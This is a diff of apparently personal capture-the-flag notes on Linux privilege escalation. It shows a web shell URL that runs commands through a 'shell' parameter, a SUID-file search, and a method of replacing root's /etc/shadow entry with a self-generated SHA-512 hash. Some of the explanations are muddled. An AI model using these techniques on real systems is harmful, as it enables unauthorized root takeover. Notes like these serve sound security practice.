@@ -2,17 +2,17 @@ cat ~/.*history | less     #to show history of hidden files
 cat a.txt, less a.txt      #cat and less to read files
 find / -user root -perm -4000 2>/dev/null  #command to search for suid files
 
+When every commands are blocked in order to see parent directory use (ls ..)
+http://10.10.87.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls ..
+
 Extracting random sha-512 passwd for root
 #mkpasswd -m sha-512 root
 root(password name)
-root:$6$GhA9S9oVP4IyMMFW$.ifjR8CYe3I/9PKAOPtU6tX5IQ/0YO.b0HhpWuhAcoAw7h11hdzHJ75RN6vEc2adGSxylyrHXmVOFYPr9HEFr/:15045:0:99999:7:: (root sha-512)
-
-root:!:15045:0:99999:7:: (original file)
+root:!:15045:0:99999:7:: (original file of /etc/shadow)
 root:$6$GhA9S9oVP4IyMMFW$.ifjR8CYe3I/9PKAOPtU6tX5IQ/0YO.b0HhpWuhAcoAw7h11hdzHJ75RN6vEc2adGSxylyrHXmVOFYPr9HEFr/:15045:0:99999:7:: (modified file)
+
 root:x:0:0:root:/root:/usr/bin/zsh (x redirects the /etc/shadow)
 When changing the su root > it takes the password from /etc/passwd first instead /etc/shadow.
-
-
 If the password is not in /etc/passwd > it takes password from /etc/shadow.
 
 Use ss command instead of netstat ( netstat needs perimssion)
